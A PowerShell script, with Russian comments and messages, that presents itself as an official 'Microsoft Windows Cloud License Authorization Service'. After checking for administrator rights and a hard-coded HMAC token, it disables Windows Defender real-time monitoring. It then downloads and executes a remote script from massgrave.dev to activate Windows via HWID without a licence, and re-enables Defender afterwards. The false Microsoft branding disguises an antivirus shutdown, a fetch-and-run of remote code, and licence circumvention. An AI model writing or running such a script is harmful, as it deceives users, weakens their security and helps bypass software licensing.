# ============================================================
#  Microsoft Windows Cloud License Authorization Service
#  Status: Production [v2.2]
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SECRET = "MS-AUTH-SECURE-KEY-2024"
$VALID_MINS = 60

# Пытаемся отключить защиту Defender на время работы (нужны права админа)
Set-MpPreference -DisableRealtimeMonitoring $true

function Verify-Token {
    param($Key)
    try {
        $clean = ($Key -replace '-', '').ToLower()
        $tsHex = $clean.Substring(0, 8)
        $sigReceived = $clean.Substring(8, 8)
        $hmac = [System.Security.Cryptography.KeyedHashAlgorithm]::Create("HmacSHA256")
        $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($SECRET)
        $computedHash = [System.BitConverter]::ToString($hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($tsHex))).Replace("-","").ToLower().Substring(0, 8)
        if ($computedHash -ne $sigReceived) { return "INVALID" }
        $created = [Convert]::ToInt64($tsHex, 16)
        $now = [System.DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        if ([Math]::Abs($now - $created) -gt ($VALID_MINS * 60)) { return "EXPIRED" }
        return "OK"
    } catch { return "ERROR" }
}

Clear-Host
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "   Windows Desktop Licensing Service [Build 22621]" -ForegroundColor White
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host ""

# Проверка на права администратора
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ОШИБКА: Запустите терминал ОТ ИМЕНИ АДМИНИСТРАТОРА!" -ForegroundColor Red
    Write-Host "Нажмите правой кнопкой на Пуск -> Терминал (Администратор)" -ForegroundColor Yellow
    Start-Sleep -Seconds 10
    exit
}

# Получаем ключ K (теперь достаем его безопасно)
$K = (Get-Variable K -ErrorAction SilentlyContinue).Value

Write-Host "Авторизация токена..." -NoNewline
$status = Verify-Token -Key $K

if ($status -eq "OK") {
    Write-Host " [УСПЕШНО]" -ForegroundColor Green
    Write-Host "Лицензия: Digital License (HWID)"
    Write-Host "Запуск активации... Пожалуйста, не закрывайте окно." -ForegroundColor Yellow
    
    # Запуск MAS
    $mas = irm "https://massgrave.dev/get"
    $executionBlock = [ScriptBlock]::Create($mas)
    & $executionBlock /hwid
    
    # Включаем защиту обратно
    Set-MpPreference -DisableRealtimeMonitoring $false
    Write-Host ""
    Write-Host "ГОТОВО! Система активирована." -ForegroundColor Green
} else {
    Write-Host " [ОТКАЗАНО]" -ForegroundColor Red
    Write-Host "Ошибка: Код доступа [$K] недействителен или истек." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "Окно закроется через 15 секунд." -ForegroundColor DarkGray
Start-Sleep -Seconds 15
